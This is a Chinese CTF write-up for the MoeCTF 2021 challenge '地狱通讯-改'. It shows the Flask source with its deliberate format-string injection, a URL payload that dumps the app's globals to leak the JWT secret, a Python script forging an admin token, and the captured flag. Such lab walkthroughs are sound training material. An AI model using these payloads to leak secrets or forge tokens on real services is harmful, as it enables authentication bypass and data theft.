### [MoeCTF 2021]地狱通讯-改

>ssti,jwt

先读代码：

```python

from flask import Flask, render_template, request, session, redirect, make_response
from secret import secret, headers, User
import datetime
import jwt
app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def index():
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    res = make_response(ctx)
    name = request.args.get('name') or ''
    if 'admin' in name or name == '':
        return res
    payload = {
        "name": name,
    }
    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
    res.set_cookie('token', token)
    return res


@app.route('/hello', methods=['GET', 'POST'])
def hello():
    token = request.cookies.get('token')
    if not token:
        return redirect('/', 302)
    try:
        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
    except jwt.exceptions.InvalidSignatureError as e:
        return "Invalid token"
    if name != "admin":
        user = User(name)
        flag = request.args.get('flag') or ''
        message = "Hello {0}, your flag is" + flag
        return message.format(user)
    else:
        return render_template('flag.html', name=name)


if __name__ == "__main__":
    app.run()
```

有代码可以知道，我们需要经过jwt后，name=admin即可获得flag，第一步是去试一试能不能直接传admin，但是不行，我们随便弄一个用户名，然后访问/hello，发现ssti注入点，我们现在就是需要找到密钥，有了密钥，我们就能伪造jwt

> {0},所以我们让exp中也有一个{0}，这样就可以将值代入进去

```
http://node5.anna.nssctf.cn:29437/hello?flag={0.__class__.__init__.__globals__}
```

![image-20240926152308374](https://gitee.com/bx33661/image/raw/master/path/image-20240926152308374.png)

```
'secret': 'u_have_kn0w_what_f0rmat_i5'
```

修改值：

```python
import jwt

# 泄露的密钥
secret_key = "u_have_kn0w_what_f0rmat_i5"

# 载荷数据
payload = {
    "name": "admin"
}

# 生成JWT
new_token = jwt.encode(payload, secret_key, algorithm="HS256")
print("新生成的JWT:", new_token)
```

修改cookie访问/hello

得到flag

```
NSSCTF{d8c63844-ebec-4759-8f25-cc26f9c939c6}.
```

